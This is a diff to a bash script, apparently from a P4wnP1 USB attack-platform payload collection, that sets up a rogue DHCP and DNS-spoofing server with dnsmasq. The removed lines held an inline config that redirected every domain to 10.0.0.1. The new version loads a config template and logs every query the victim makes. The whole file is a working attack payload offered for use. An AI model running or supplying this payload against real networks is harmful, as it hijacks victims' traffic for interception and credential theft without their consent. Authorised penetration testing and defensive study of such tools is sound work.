@@ -1,17 +1,29 @@
 #!/bin/bash
-# Start rogue DHCP and DNS server using dnsmasq
+# payloads/network/rogue_dhcp_dns.sh
 
-cat << EOC > /tmp/dnsmasq-usb0.conf
-domain-needed
-bogus-priv
-interface=usb0
-dhcp-range=10.0.0.50,10.0.0.150,12h
-dhcp-option=3,10.0.0.1
-dhcp-option=6,10.0.0.1
-address=/#/10.0.0.1
-EOC
+### Description: Rogue DHCP + DNS spoofing payload using dnsmasq
+### Requirements: dnsmasq, custom dnsmasq.conf template
 
-pkill dnsmasq
-sleep 1
+set -e
 
-sudo dnsmasq -C /tmp/dnsmasq-usb0.conf -d
+PAYLOAD_NAME="rogue_dhcp_dns"
+LOG_DIR="/opt/p4wnp1/logs"
+DNSMASQ_CONF="/opt/p4wnp1/config/${PAYLOAD_NAME}_dnsmasq.conf"
+
+# Prepare log directory
+mkdir -p "$LOG_DIR"
+
+# Kill existing dnsmasq if running
+pkill dnsmasq || true
+
+# Start dnsmasq with rogue DHCP and DNS
+if [ ! -f "$DNSMASQ_CONF" ]; then
+  echo "[!] Missing config: $DNSMASQ_CONF"
+  exit 1
+fi
+
+echo "[+] Launching dnsmasq for rogue DHCP/DNS..."
+dnsmasq --conf-file="$DNSMASQ_CONF" --log-queries --log-facility="$LOG_DIR/${PAYLOAD_NAME}.log" &
+
+echo "[+] Rogue DHCP + DNS started. Logs: $LOG_DIR/${PAYLOAD_NAME}.log"
+exit 0
